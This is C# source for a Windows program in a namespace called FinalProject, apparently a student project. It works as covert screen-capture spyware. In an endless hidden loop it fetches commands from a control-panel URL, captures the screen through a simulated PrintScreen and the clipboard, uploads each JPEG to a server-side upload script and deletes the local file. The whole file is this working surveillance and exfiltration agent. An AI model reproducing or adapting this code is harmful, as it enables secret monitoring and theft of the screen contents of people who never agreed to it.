﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Threading;

namespace FinalProject
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
      
        static void Main()
        {
              string filename = "";
              int time=30000;
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            while(true)
            {

                if (HasConnection() == true)
                {

                    if(File.Exists(filename))
                    {
                        WebClient myWebClient = new WebClient();
                        byte[] responseArray = myWebClient.UploadFile("http://127.0.0.1/final/upload.php", filename);
                        Thread.Sleep(3000);
                        File.Delete(filename);
                    }






                    string command = getcommand();
                    string[] commands = command.Split('^');
                    time = Convert.ToInt32(commands[1]);
                    if (commands[0] == "start")
                    {
                        // MessageBox.Show("kk");
                        SendKeys.SendWait("{PRTSC}");
                        if (Clipboard.ContainsImage() == true)
                        {
                            filename = GetTimestamp(DateTime.Now)+".jpeg";
                            Image image = (Image)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);
                            image.Save(filename, System.Drawing.Imaging.ImageFormat.Jpeg);
                        }

                    }
                }
                else
                {

                    // ter = false;
                }

                Thread.Sleep(time);


            }
            Application.Run();
            
        }
        public static String GetTimestamp(DateTime value)
        {
            return value.ToString("yyyyMMddHHmmssffff");
        }

        public static string getcommand()
        {
           
            WebRequest request = WebRequest.Create("http://127.0.0.1/final/Panel/command.txt");
            WebResponse response = request.GetResponse();

            using (Stream dataStream = response.GetResponseStream())
            {
                // Open the stream using a StreamReader for easy access.
                StreamReader reader = new StreamReader(dataStream);
                // Read the content.
                string responseFromServer = reader.ReadToEnd();
                // Display the content.
              //  MessageBox.Show(responseFromServer);
                return responseFromServer;
            }
          //  Stream dataStream = response.GetResponseStream();
            
           
        }
        public static bool HasConnection()
        {
            try
            {

                System.Net.IPHostEntry i = System.Net.Dns.GetHostEntry("www.google.com");

                return true;
            }
            catch
            {

                return false;
            }
        }
    }
}
